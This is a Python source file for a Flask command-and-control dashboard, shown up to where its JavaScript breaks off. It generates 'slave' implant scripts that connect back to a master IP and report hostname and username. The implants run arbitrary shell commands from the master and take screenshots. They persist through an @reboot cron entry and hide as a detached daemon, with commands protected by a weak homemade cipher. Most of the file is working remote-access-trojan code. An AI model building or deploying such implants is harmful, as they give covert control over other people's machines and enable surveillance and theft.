#!/usr/bin/env python3
"""
Master Controller – CyberOps Edition
Real-time slave management, command dispatch, live dashboard.
"""

import socket
import threading
import struct
import time
import uuid
import json
import os
import hashlib
import secrets
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, Response


# ========== CONFIGURATION ==========
TCP_PORT     = 5555
WEB_HOST     = '0.0.0.0'
WEB_PORT     = 5000
DB_FILE      = 'slaves.json'
MASTER_IP    = '192.168.0.1'   # <-- SET YOUR MASTER IP HERE
# ====================================

slaves        = {}   # slave_id -> metadata dict
active_slaves = {}   # slave_id -> socket
event_log     = []   # list of event strings (latest first)
slaves_lock   = threading.Lock()
log_lock      = threading.Lock()
running       = True

MAX_LOG = 200

# ========== LOGGING ==========
def log_event(msg: str):
    ts = datetime.now().strftime('%H:%M:%S')
    entry = f"[{ts}] {msg}"
    with log_lock:
        event_log.insert(0, entry)
        if len(event_log) > MAX_LOG:
            event_log.pop()
    print(entry)

# ========== PERSISTENCE ==========
def load_slaves():
    global slaves
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                data = json.load(f)
            with slaves_lock:
                slaves.clear()
                slaves.update(data)
            log_event(f"DB loaded — {len(slaves)} node(s) registered")
        except Exception as e:
            log_event(f"DB load failed: {e}")
            slaves = {}

def save_slaves():
    try:
        with slaves_lock:
            to_save = {sid: {k: v for k, v in info.items()} for sid, info in slaves.items()}
        with open(DB_FILE, 'w') as f:
            json.dump(to_save, f, indent=2)
    except Exception as e:
        log_event(f"DB save error: {e}")

# ========== TCP SERVER ==========
def recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

# ========== ENCRYPTION FUNCTIONS ==========
def derive_key(slave_id: str) -> bytes:
  return hashlib.sha256(slave_id.encode()).digest()

def encrypt_stream(data: bytes, key: bytes, nonce: bytes) -> bytes:
  result = bytearray()
  for i, b in enumerate(data):
    counter = i.to_bytes(8, 'big')
    stream_block = hashlib.sha256(key + nonce + counter).digest()
    result.append(b ^ stream_block[0])
  return bytes(result)

def decrypt_stream(data: bytes, key: bytes, nonce: bytes) -> bytes:
  return encrypt_stream(data, key, nonce)
# ===========================================

def handle_slave(client_sock, addr):

    slave_id = None
    name = None
    try:
        raw = recv_exact(client_sock, 4)
        if not raw:
            return
        id_len = struct.unpack('<I', raw)[0]
        slave_id = recv_exact(client_sock, id_len)
        if not slave_id:
            return
        slave_id = slave_id.decode('utf-8').strip()

        with slaves_lock:
            if slave_id not in slaves:
                client_sock.sendall(b"ERR_UNKNOWN_ID")
                client_sock.close()
                log_event(f"REJECTED unknown ID {slave_id} from {addr[0]}")
                return
            active_slaves[slave_id] = client_sock
            slaves[slave_id]['last_seen']   = time.time()
            slaves[slave_id]['ip']          = addr[0]
            slaves[slave_id]['connect_time'] = time.time()
            name = slaves[slave_id]['name']
            # Store encryption key derived from slave ID
            # Store encryption key derived from slave ID (optional, can be derived on the fly)
            # slaves[slave_id]['key'] = derive_key(slave_id)

        save_slaves()
        client_sock.sendall(b"REG_OK")
        log_event(f"NODE ONLINE  [{name}] {slave_id[:8]} — {addr[0]}")

        # ----- Receive node profile -----
        try:
            len_raw = recv_exact(client_sock, 4)
            if len_raw:
                prof_len = struct.unpack('<I', len_raw)[0]
                prof_data = recv_exact(client_sock, prof_len)
                if prof_data:
                    profile = json.loads(prof_data.decode())
                    # Store profile info in slave metadata
                    slaves[slave_id].update(profile)
                    save_slaves()
                    log_event(f"PROFILE [{name}] {profile}")
        except Exception as e:
            log_event(f"PROFILE RECEIVE ERROR [{name}]: {e}")

        # Start heartbeat sender (send length 0 every 30 seconds)
        def heartbeat_sender():
            while slave_id in active_slaves:
                time.sleep(30)
                try:
                    client_sock.sendall(struct.pack('<I', 0))
                except:
                    break
        threading.Thread(target=heartbeat_sender, daemon=True).start()

        # Keep-alive loop to detect disconnection
        while True:
            peek = client_sock.recv(1, socket.MSG_PEEK)
            if peek == b'':
                break
            time.sleep(1)

    except Exception:
        pass
    finally:
        with slaves_lock:
            if slave_id and slave_id in active_slaves:
                del active_slaves[slave_id]
            if slave_id and slave_id in slaves:
                slaves[slave_id]['last_seen'] = time.time()
                slaves[slave_id]['ip']         = None
                name = slaves[slave_id]['name']
                save_slaves()
        log_event(f"NODE OFFLINE [{name}] {slave_id[:8] if slave_id else '?'}")
        try:
            client_sock.close()
        except Exception:
            pass

def tcp_server_loop():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', TCP_PORT))
    srv.listen(20)
    log_event(f"TCP listener up on :{TCP_PORT}")
    while running:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=handle_slave, args=(conn, addr), daemon=True).start()
        except OSError:
            break

# ========== COMMAND EXECUTION ==========
def execute_command(slave_id: str, command: str) -> str:
    with slaves_lock:
      sock = active_slaves.get(slave_id)
      info = slaves.get(slave_id)
      name = info.get('name', slave_id[:8]) if info else slave_id[:8]
      # Derive encryption key on the fly if not present in metadata
      key = info.get('key') if info and 'key' in info else derive_key(slave_id)

    if not sock:
        return f"ERROR: node '{name}' is offline"
    if not key:
        return f"ERROR: encryption key not available for '{name}'"

    try:
        # Generate random nonce for this command
        nonce = secrets.token_bytes(8)
        cmd_bytes = command.encode('utf-8')
        encrypted_cmd = encrypt_stream(cmd_bytes, key, nonce)

        # Send length (plain), then nonce, then encrypted command
        sock.sendall(struct.pack('<I', len(cmd_bytes)))
        sock.sendall(nonce)
        sock.sendall(encrypted_cmd)

        # Receive output length
        len_raw = recv_exact(sock, 4)
        if not len_raw:
            raise ConnectionError("connection lost during length read")
        out_len = struct.unpack('<I', len_raw)[0]
        if out_len == 0:
            return "(no output)"

        # Receive nonce and encrypted output
        out_nonce = recv_exact(sock, 8)
        if not out_nonce:
            raise ConnectionError("connection lost during nonce read")
        encrypted_out = recv_exact(sock, out_len)
        if encrypted_out is None:
            raise ConnectionError("connection lost during data read")

        output = decrypt_stream(encrypted_out, key, out_nonce).decode('utf-8', errors='replace')
        log_event(f"CMD [{name}] » {command[:60]}")
        return output

    except Exception as e:
        with slaves_lock:
            if slave_id in active_slaves:
                del active_slaves[slave_id]
            if slave_id in slaves:
                slaves[slave_id]['ip'] = None
                save_slaves()
        log_event(f"COMM ERROR [{name}]: {e}")
        return f"Communication error: {e}"

# ========== SLAVE SCRIPT GENERATOR ==========
def generate_slave_script(slave_id: str, slave_name: str) -> str:
    return f'''#!/usr/bin/env python3
# =============================================
#  Slave Node — {slave_name}
#  ID: {slave_id}
#  Master: {MASTER_IP}:{TCP_PORT}
#  Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# =============================================

import socket
import subprocess
import struct
import time
import sys
import hashlib
import secrets
import json
import os
import base64

# ========== ENCRYPTION ==========
def derive_key(slave_id: str) -> bytes:
    return hashlib.sha256(slave_id.encode()).digest()

def encrypt_stream(data: bytes, key: bytes, nonce: bytes) -> bytes:
    result = bytearray()
    for i, b in enumerate(data):
        counter = i.to_bytes(8, 'big')
        stream_block = hashlib.sha256(key + nonce + counter).digest()
        result.append(b ^ stream_block[0])
    return bytes(result)

def decrypt_stream(data: bytes, key: bytes, nonce: bytes) -> bytes:
    return encrypt_stream(data, key, nonce)
# ================================

MASTER_IP   = "{MASTER_IP}"
MASTER_PORT = {TCP_PORT}
SLAVE_ID    = "{slave_id}"
NODE_NAME   = "{slave_name}"
RETRY_DELAY = 10

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def take_screenshot():
    import subprocess, tempfile
    tmp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
    tmp_path = tmp_file.name
    tmp_file.close()
    commands = [
        ['gnome-screenshot', '-f', tmp_path],
        ['scrot', '-q', '100', tmp_path],
        ['import', '-window', 'root', tmp_path],
    ]
    success = False
    for cmd in commands:
        try:
            subprocess.run(cmd, check=True, timeout=5, capture_output=True)
            success = True
            break
        except:
            continue
    if not success:
        return "ERROR: No screenshot tool found."
    with open(tmp_path, 'rb') as f:
        img_data = f.read()
    os.unlink(tmp_path)
    return base64.b64encode(img_data).decode()

def run_command(cmd):
    if cmd.strip().lower() == 'screenshot':
        return take_screenshot().encode()
    try:
        result = subprocess.run(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=60
        )
        output = result.stdout + result.stderr
        return output if output else b"(no output)"
    except subprocess.TimeoutExpired:
        return b"ERROR: command timed out (60s limit)"
    except Exception as e:
        return f"ERROR: {{e}}".encode()

def connect_and_serve():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    s.connect((MASTER_IP, MASTER_PORT))
    s.settimeout(60)

    id_bytes = SLAVE_ID.encode()
    s.sendall(struct.pack("<I", len(id_bytes)) + id_bytes)

    ack = s.recv(16)
    if ack != b"REG_OK":
        s.close()
        raise ConnectionRefusedError(f"Master rejected node (response: {{ack}})")

    key = derive_key(SLAVE_ID)

    import getpass, socket as socket_lib
    profile = {{
        "hostname": socket_lib.gethostname(),
        "cwd": os.getcwd(),
        "username": getpass.getuser()
    }}
    profile_json = json.dumps(profile).encode()
    s.sendall(struct.pack("<I", len(profile_json)))
    s.sendall(profile_json)

    print(f"[+] Registered as {{NODE_NAME}} ({{SLAVE_ID[:8]}}...)")
    print(f"[+] Waiting for commands from {{MASTER_IP}}:{{MASTER_PORT}}")

    while True:
        len_raw = recv_exact(s, 4)
        if not len_raw:
            raise ConnectionError("Master closed connection")
        cmd_len = struct.unpack("<I", len_raw)[0]
        if cmd_len == 0:
            continue
        nonce = recv_exact(s, 8)
        if not nonce:
            raise ConnectionError("Failed to read nonce")
        encrypted_cmd = recv_exact(s, cmd_len)
        if not encrypted_cmd:
            raise ConnectionError("Failed to read encrypted command")
        command = decrypt_stream(encrypted_cmd, key, nonce).decode("utf-8", errors="replace").strip()
        print(f"[>] Executing: {{command}}")
        output = run_command(command)
        out_nonce = secrets.token_bytes(8)
        encrypted_out = encrypt_stream(output, key, out_nonce)
        s.sendall(struct.pack("<I", len(output)))
        s.sendall(out_nonce)
        s.sendall(encrypted_out)

def daemonize():
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"First fork failed: {{e}}\\n")
        sys.exit(1)
    os.chdir("/")
    os.setsid()
    os.umask(0)
    try:
        if os.fork() > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Second fork failed: {{e}}\\n")
        sys.exit(1)
    for fd in (sys.stdin, sys.stdout, sys.stderr):
        try:
            fd.close()
        except:
            pass
    devnull = open(os.devnull, 'rb+')
    os.dup2(devnull.fileno(), 0)
    os.dup2(devnull.fileno(), 1)
    os.dup2(devnull.fileno(), 2)
    devnull.close()

def install_cron():
    import subprocess
    script_path = os.path.abspath(sys.argv[0])
    try:
        existing = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
    except subprocess.CalledProcessError:
        existing = ""
    reboot_line = f"@reboot {{sys.executable}} {{script_path}} --daemon\\n"
    if reboot_line in existing:
        return False
    new_cron = existing + reboot_line
    proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
    proc.communicate(new_cron.encode())
    return proc.returncode == 0

def main():
    import sys, os, subprocess

    def is_installed():
        try:
            existing = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
            script_path = os.path.abspath(sys.argv[0])
            return f"@reboot {{sys.executable}} {{script_path}} --daemon" in existing
        except:
            return False

    # Determine if we should daemonize
    should_daemonize = False

    if not is_installed():
        print(f"=== Slave Node: {{NODE_NAME}} ===")
        print("Auto-start on boot is NOT installed. Installing now...")
        if install_cron():
            print("[+] Installed @reboot cron job. Slave will start on every boot.")
        else:
            print("[!] Failed to install cron job. Continuing anyway.")
        should_daemonize = True  # First run -> daemonize immediately
    elif len(sys.argv) > 1 and sys.argv[1] == '--daemon':
        should_daemonize = True  # Explicit request

    if should_daemonize:
        daemonize()  # Only the child process continues past this point

    # Now the main connection loop (runs in foreground if not daemonized,
    # or in the child process after daemonizing)
    print(f"=== Slave Node: {{NODE_NAME}} ===")
    print(f"=== Connecting to {{MASTER_IP}}:{{MASTER_PORT}} ===")
    while True:
        try:
            connect_and_serve()
        except KeyboardInterrupt:
            print("\\n[*] Interrupted. Exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"[!] {{e}}")
            print(f"[*] Reconnecting in {{RETRY_DELAY}}s...")
            time.sleep(RETRY_DELAY)

if __name__ == "__main__":
    main()
'''

def save_slave_script(slave_id: str, slave_name: str, content: str) -> str:
    safe_name = slave_name.replace(' ', '_').replace('/', '_')
    filename = f"slave_{safe_name}_{slave_id[:8]}.py"
    # Use user's home directory for storing scripts (always writable)
    script_dir = os.path.join(os.path.expanduser('~'), '.master_controller_scripts')
    os.makedirs(script_dir, exist_ok=True)
    filepath = os.path.join(script_dir, filename)
    with open(filepath, 'w') as f:
        f.write(content)
    log_event(f"Script saved: {filename}")
    return filename

# ========== FLASK ==========
app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MASTER CONTROLLER</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap');

  :root {
    --bg0:    #080b10;
    --bg1:    #0c1018;
    --bg2:    #111620;
    --bg3:    #181e2a;
    --border: #1e2838;
    --border2:#253040;
    --cyan:   #00c8d4;
    --cyan2:  #00e5f0;
    --green:  #00e676;
    --red:    #ff3d57;
    --amber:  #ffb300;
    --blue:   #448aff;
    --muted:  #4a5568;
    --text:   #c8d6e5;
    --text2:  #8899aa;
    --mono:   'JetBrains Mono', monospace;
    --sans:   'Inter', sans-serif;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg0);
    color: var(--text);
    font-family: var(--sans);
    font-size: 13px;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* ---- TOPBAR ---- */
  #topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 24px;
    height: 52px;
    background: var(--bg1);
    border-bottom: 1px solid var(--border);
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .logo {
    font-family: var(--mono);
    font-weight: 700;
    font-size: 13px;
    letter-spacing: 3px;
    color: var(--cyan);
    text-transform: uppercase;
  }
  .logo span { color: var(--text2); font-weight: 400; }
  .topbar-meta {
    display: flex;
    gap: 24px;
    align-items: center;
    font-family: var(--mono);
    font-size: 11px;
    color: var(--text2);
  }
  .stat-pill {
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .stat-pill .val {
    font-size: 15px;
    font-weight: 700;
    color: var(--cyan);
  }
  .stat-pill .val.green { color: var(--green); }
  .stat-pill .val.red   { color: var(--red); }
  .dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    background: var(--green);
    box-shadow: 0 0 6px var(--green);
    animation: pulse 2s infinite;
  }
  @keyframes pulse {
    0%,100% { opacity: 1; }
    50%      { opacity: 0.4; }
  }
  #clock { font-family: var(--mono); font-size: 11px; color: var(--text2); }

  /* ---- LAYOUT ---- */
  #layout {
    display: grid;
    grid-template-columns: 1fr 340px;
    grid-template-rows: auto auto 1fr;
    gap: 0;
    height: calc(100vh - 52px);
  }

  /* ---- PANELS ---- */
  .panel {
    background: var(--bg1);
    border-right: 1px solid var(--border);
    border-bottom: 1px solid var(--border);
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }
  .panel-head {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 16px;
    border-bottom: 1px solid var(--border);
    background: var(--bg2);
    flex-shrink: 0;
  }
  .panel-head h2 {
    font-family: var(--mono);
    font-size: 10px;
    font-weight: 600;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--text2);
  }
  .panel-head .badge {
    font-family: var(--mono);
    font-size: 10px;
    padding: 1px 7px;
    border-radius: 3px;
    background: var(--bg3);
    border: 1px solid var(--border2);
    color: var(--cyan);
    margin-left: auto;
  }
  .accent-line {
    width: 3px; height: 14px;
    background: var(--cyan);
    border-radius: 2px;
    flex-shrink: 0;
  }
  .accent-line.green { background: var(--green); }
  .accent-line.amber { background: var(--amber); }
  .accent-line.red   { background: var(--red); }

  /* ---- NODES TABLE ---- */
  #nodes-panel {
    grid-column: 1;
    grid-row: 1;
  }
  .table-wrap { overflow-y: auto; flex: 1; }
  table {
    width: 100%;
    border-collapse: collapse;
    font-family: var(--mono);
  }
  thead th {
    position: sticky; top: 0;
    background: var(--bg2);
    padding: 8px 16px;
    text-align: left;
    font-size: 9px;
    font-weight: 600;
    letter-spacing: 1.5px;
    text-transform: uppercase;
    color: var(--muted);
    border-bottom: 1px solid var(--border);
    white-space: nowrap;
  }
  tbody tr {
    border-bottom: 1px solid var(--border);
    cursor: pointer;
    transition: background 0.12s;
  }
  tbody tr:hover   { background: var(--bg3); }
  tbody tr.sel-row { background: rgba(0,200,212,.07); border-left: 2px solid var(--cyan); }
  tbody td {
    padding: 10px 16px;
    font-size: 11px;
    color: var(--text);
    white-space: nowrap;
  }
  .node-name {
    font-weight: 600;
    font-size: 12px;
    color: var(--text);
  }
  .node-id {
    font-size: 10px;
    color: var(--muted);
    margin-top: 1px;
  }
  .status-badge {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 10px;
    font-weight: 600;
    letter-spacing: 0.5px;
    padding: 3px 8px;
    border-radius: 3px;
  }
  .s-online  { background: rgba(0,230,118,.1); color: var(--green); border: 1px solid rgba(0,230,118,.25); }
  .s-offline { background: rgba(74,85,104,.15); color: var(--muted); border: 1px solid var(--border2); }
  .s-dot { width: 5px; height: 5px; border-radius: 50%; background: currentColor; }
  .s-online .s-dot { box-shadow: 0 0 4px var(--green); animation: pulse 2s infinite; }

  /* ---- COMMAND PANEL ---- */
  #cmd-panel {
    grid-column: 1;
    grid-row: 2;
    max-height: 260px;
  }
  .cmd-body { padding: 14px 16px; display: flex; flex-direction: column; gap: 10px; }
  .target-row {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .target-info {
    flex: 1;
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg2);
    border: 1px solid var(--border2);
    border-radius: 4px;
    padding: 7px 12px;
    font-family: var(--mono);
    font-size: 11px;
  }
  .target-label { color: var(--muted); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; }
  .target-val   { color: var(--cyan); font-weight: 600; }
  #cmd-input {
    width: 100%;
    background: var(--bg2);
    border: 1px solid var(--border2);
    border-radius: 4px;
    padding: 10px 14px;
    font-family: var(--mono);
    font-size: 12px;
    color: var(--text);
    outline: none;
    transition: border-color 0.15s;
  }
  #cmd-input:focus { border-color: var(--cyan); }
  #cmd-input::placeholder { color: var(--muted); }
  .cmd-actions { display: flex; gap: 8px; align-items: center; }
  .btn {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 8px 16px;
    border-radius: 4px;
    font-family: var(--mono);
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 0.5px;
    cursor: pointer;
    border: 1px solid transparent;
    transition: all 0.15s;
    user-select: none;
  }
  .btn-primary {
    background: var(--cyan);
    color: #000;
    border-color: var(--cyan);
  }
  .btn-primary:hover { background: var(--cyan2); box-shadow: 0 0 14px rgba(0,200,212,.4); }
  .btn-ghost {
    background: transparent;
    color: var(--text2);
    border-color: var(--border2);
  }
  .btn-ghost:hover { border-color: var(--cyan); color: var(--cyan); }
  .btn-danger {
    background: transparent;
    color: var(--red);
    border-color: rgba(255,61,87,.3);
  }
  .btn-danger:hover { background: rgba(255,61,87,.1); }
  .btn-disabled { opacity: 0.35; pointer-events: none; }
  .hint { font-family: var(--mono); font-size: 10px; color: var(--muted); margin-left: auto; }

  /* ---- OUTPUT PANEL ---- */
  #output-panel {
    grid-column: 1;
    grid-row: 3;
  }
  #output-body {
    flex: 1;
    overflow-y: auto;
    padding: 12px 16px;
    font-family: var(--mono);
    font-size: 11px;
    line-height: 1.7;
    color: var(--green);
    background: var(--bg0);
  }
  #output-body .placeholder { color: var(--muted); font-style: italic; }
  #output-body .err { color: var(--red); }
  #output-body .cmd-echo { color: var(--cyan); margin-bottom: 4px; }

  /* ---- RIGHT SIDEBAR ---- */
  #sidebar {
    grid-column: 2;
    grid-row: 1 / 4;
    display: flex;
    flex-direction: column;
    border-left: 1px solid var(--border);
    border-right: none;
    overflow: hidden;
  }

  /* ---- CREATE NODE ---- */
  #create-panel { flex-shrink: 0; }
  .create-body { padding: 14px 16px; display: flex; flex-direction: column; gap: 10px; }
  #slave-name-input {
    width: 100%;
    background: var(--bg2);
    border: 1px solid var(--border2);
    border-radius: 4px;
    padding: 9px 12px;
    font-family: var(--mono);
    font-size: 12px;
    color: var(--text);
    outline: none;
    transition: border-color 0.15s;
  }
  #slave-name-input:focus { border-color: var(--cyan); }
  #slave-name-input::placeholder { color: var(--muted); }
  #create-btn { width: 100%; justify-content: center; }

  /* ---- SCRIPT PREVIEW ---- */
  #script-panel { flex-shrink: 0; display: none; }
  .script-meta { padding: 10px 16px; background: var(--bg2); border-bottom: 1px solid var(--border); }
  .script-meta-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
  .script-meta-key { font-family: var(--mono); font-size: 10px; color: var(--muted); }
  .script-meta-val { font-family: var(--mono); font-size: 10px; color: var(--cyan); }
  .script-actions { display: flex; gap: 6px; padding: 10px 16px; border-bottom: 1px solid var(--border); }
  .script-actions .btn { flex: 1; justify-content: center; font-size: 10px; padding: 7px 10px; }
  #script-code {
    max-height: 180px;
    overflow-y: auto;
    padding: 12px 16px;
    font-family: var(--mono);
    font-size: 10px;
    line-height: 1.6;
    color: var(--text2);
    background: var(--bg0);
    white-space: pre;
    overflow-x: auto;
  }

  /* ---- Terminal table for live hosts ---- */
  .term-table {
    width: 100%;
    border-collapse: collapse;
    font-family: var(--mono);
    font-size: 11px;
  }
  .term-table th {
    text-align: left;
    padding: 6px 12px;
    background: var(--bg2);
    color: var(--cyan);
    font-weight: 600;
    font-size: 9px;
    letter-spacing: 1px;
    border-bottom: 1px solid var(--border2);
  }
  .term-table td {
    padding: 8px 12px;
    border-bottom: 1px solid var(--border);
    color: var(--text2);
  }
  .term-table tr:hover {
    background: var(--bg3);
    cursor: pointer;
  }
  .term-table .term-name {
    color: var(--green);
    font-weight: 600;
  }
  .term-table .term-ip {
    font-family: var(--mono);
    color: var(--text);
  }
  .term-table .term-last {
    font-size: 10px;
    color: var(--muted);
  }
  .term-table .term-label {
    background: var(--bg3);
    padding: 2px 6px;
    border-radius: 3px;
    font-size: 9px;
    color: var(--cyan);
    display: inline-block;
  }

  /* ---- EVENT LOG ---- */
  #log-panel { flex: 1; display: flex; flex-direction: column; overflow: hidden; }

  #log-body {
    flex: 1;
    overflow-y: auto;
    padding: 8px 12px;
    font-family: var(--mono);
    font-size: 10px;
    line-height: 1.8;
    color: var(--text2);
    background: var(--bg0);
  }
  .log-line { border-bottom: 1px solid rgba(30,40,56,.5); padding: 2px 0; }
  .log-line .ts  { color: var(--muted); margin-right: 8px; }
  .log-line.info  { color: var(--text2); }
  .log-line.good  { color: var(--green); }
  .log-line.warn  { color: var(--amber); }
  .log-line.bad   { color: var(--red); }

  /* ---- SCROLLBAR ---- */
  ::-webkit-scrollbar { width: 4px; height: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }

  /* ---- TOAST ---- */
  #toast {
    position: fixed;
    bottom: 24px; right: 24px;
    padding: 10px 18px;
    background: var(--bg3);
    border: 1px solid var(--cyan);
    border-radius: 4px;
    font-family: var(--mono);
    font-size: 11px;
    color: var(--cyan);
    opacity: 0;
    transform: translateY(8px);
    transition: all 0.2s;
    z-index: 999;
    pointer-events: none;
  }
  #toast.show { opacity: 1; transform: translateY(0); }

  /* ---- LOADING ---- */
  .spin {
    display: inline-block;
    width: 12px; height: 12px;
    border: 2px solid var(--border2);
    border-top-color: var(--cyan);
    border-radius: 50%;
    animation: spin .6s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<!-- TOPBAR -->
<div id="topbar">
  <div class="logo">MASTER<span> / </span>CONTROLLER</div>
  <div class="topbar-meta">
    <div class="stat-pill"><div class="dot"></div><span>LIVE</span></div>
    <div class="stat-pill"><span>ONLINE</span><span class="val green" id="tb-online">0</span></div>
    <div class="stat-pill"><span>TOTAL</span><span class="val" id="tb-total">0</span></div>
    <div class="stat-pill"><span>MASTER</span><span class="val">__MASTER_IP__:__TCP_PORT__</span></div>
    <div id="clock"></div>
  </div>
</div>

<div id="layout">

  <!-- NODES TABLE -->
  <div class="panel" id="nodes-panel">
    <div class="panel-head">
      <div class="accent-line green"></div>
      <h2>Registered Nodes</h2>
      <div class="badge" id="nodes-count">0 nodes</div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Node</th>
            <th>Status</th>
            <th>IP Address</th>
            <th>Last Seen</th>
            <th>Script</th>
          </tr>
        </thead>
        <tbody id="nodes-body">
          <tr><td colspan="5" style="text-align:center;color:var(--muted);padding:30px;font-family:var(--mono);font-size:11px;">No nodes registered — create one →</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- COMMAND PANEL -->
  <div class="panel" id="cmd-panel">
    <div class="panel-head">
      <div class="accent-line amber"></div>
      <h2>Command Dispatch</h2>
    </div>
    <div class="cmd-body">
      <div class="target-row">
        <div class="target-info">
          <span class="target-label">Target</span>
          <span class="target-val" id="target-display">— select a node above —</span>
        </div>
        <button class="btn btn-ghost" onclick="clearTarget()" title="Clear selection">✕</button>
      </div>
      <input type="text" id="cmd-input" placeholder="ls -la / uptime / df -h / cat /etc/os-release" autocomplete="off" spellcheck="false" onkeydown="cmdKeydown(event)">
      <div class="cmd-actions">
        <button class="btn btn-primary btn-disabled" id="run-btn" onclick="runCommand()">
          <span>▶ EXECUTE</span>
        </button>
        <button class="btn btn-primary btn-disabled" id="screenshot-btn" onclick="runScreenshot()" style="background: var(--green); border-color: var(--green); color: #000;" disabled>
          📸 SCREENSHOT
        </button>
        <button class="btn btn-ghost" onclick="clearOutput()">CLR</button>
        <span class="hint">ENTER to send</span>
      </div>
    </div>
  </div>

  <!-- OUTPUT PANEL -->
  <div class="panel" id="output-panel">
    <div class="panel-head">
      <div class="accent-line"></div>
      <h2>Output</h2>
      <div class="badge" id="out-target">no target</div>
    </div>
    <div id="output-body">
      <span class="placeholder">› Awaiting command execution...</span>
    </div>
  </div>

  <!-- SIDEBAR -->
  <div id="sidebar">

    <!-- CREATE NODE -->
    <div class="panel" id="create-panel">
      <div class="panel-head">
        <div class="accent-line"></div>
        <h2>Register New Node</h2>
      </div>
      <div class="create-body">
        <input type="text" id="slave-name-input" placeholder="node name  (e.g. server-01)" maxlength="40" autocomplete="off" onkeydown="if(event.key==='Enter')createSlave()">
        <button class="btn btn-primary" id="create-btn" onclick="createSlave()">
          <span id="create-btn-inner">+ GENERATE NODE</span>
        </button>
      </div>
    </div>

    <!-- SCRIPT PREVIEW -->
    <div class="panel" id="script-panel">
      <div class="panel-head">
        <div class="accent-line green"></div>
        <h2>Generated Script</h2>
      </div>
      <div class="script-meta">
        <div class="script-meta-row">
          <span class="script-meta-key">NAME</span>
          <span class="script-meta-val" id="smeta-name">—</span>
        </div>
        <div class="script-meta-row">
          <span class="script-meta-key">ID</span>
          <span class="script-meta-val" id="smeta-id">—</span>
        </div>
        <div class="script-meta-row">
          <span class="script-meta-key">FILE</span>
          <span class="script-meta-val" id="smeta-file">—</span>
        </div>
      </div>
      <div class="script-actions">
        <button class="btn btn-primary" onclick="downloadScript()">↓ DOWNLOAD</button>
        <button class="btn btn-ghost" onclick="copyScript()">⧉ COPY</button>
      </div>
      <pre id="script-code"></pre>
    </div>

    <!-- LIVE HOSTS – TERMINAL VIEW -->
    <div class="panel" id="live-terminal-panel">
      <div class="panel-head">
        <div class="accent-line green"></div>
        <h2>Live Hosts (Terminal)</h2>
        <div class="badge" id="live-term-count">0 online</div>
      </div>
      <div style="overflow-x: auto; flex: 1;">
        <table class="term-table" id="live-term-table">
          <thead>
            <tr><th>NODE</th><th>IP</th><th>LAST SEEN</th><th>USER</th><th>TERM</th></tr>
          </thead>
          <tbody id="live-term-body">
            <tr><td colspan="4" style="text-align:center;color:var(--muted);padding:20px;">No live hosts</td></tr>
          </tbody>
        </table>
      </div>
    </div>

    <!-- EVENT LOG -->
    <div class="panel" id="log-panel">
      <div class="panel-head">
        <div class="accent-line red"></div>
        <h2>Event Log</h2>
        <div class="badge" id="log-count">0</div>
      </div>
      <div id="log-body">
        <div class="log-line info"><span class="ts">--:--:--</span>System starting...</div>
      </div>
    </div>

  </div>
</div>

<div id="toast"></div>

<script>
// ---- STATE ----
let selectedId   = null;
let selectedName = null;
let allSlaves    = {};
let lastLogLen   = 0;
let pendingScript = null;

// ---- CLOCK ----
function tick() {
  const now = new Date();
  document.getElementById('clock').textContent =
    now.toISOString().replace('T',' ').substring(0,19) + ' UTC';
}
setInterval(tick, 1000); tick();

// ---- TOAST ----
let toastTimer;
function toast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => el.classList.remove('show'), 2500);
}

// ---- HELPERS ----
function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
